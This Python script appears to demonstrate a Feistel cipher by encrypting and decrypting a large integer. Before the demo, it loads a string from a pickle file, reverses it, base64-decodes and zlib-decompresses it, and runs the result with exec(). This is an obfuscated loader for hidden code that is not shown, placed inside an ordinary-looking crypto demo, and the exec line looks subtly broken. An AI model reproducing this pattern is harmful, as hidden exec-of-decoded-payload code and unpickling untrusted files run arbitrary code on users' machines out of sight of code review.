from feistel import feistel
import sp
import json
import pickle




if __name__ == "__main__":                         
    with open('obfuscated.pkl', 'rb') as f:
        secret_string = pickle.load(f)
    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(format(secret_string.encode('ascii'))))

    key= 13411513132135163176315631458684896498484658986451898641986649865
    message = 84614865147984615896489648984894898489489489479848479649861849861849
    print(f"Plaintext before encryption: {message : >40}")
    feistelObj = feistel(key, sp.SP_Network, 16)
    Ct = feistelObj.feistel_network(message=message, encrypt_flag=1)
    CipherText = int(Ct, 2)
    print(f"Ciphertext: {CipherText: >57}")
    
    
    Pt = feistelObj.feistel_network(message=Ct, encrypt_flag=0)
    Plaintext = int(Pt, 2)
    print(f"Plaintext after decryption:  {Plaintext: >40}")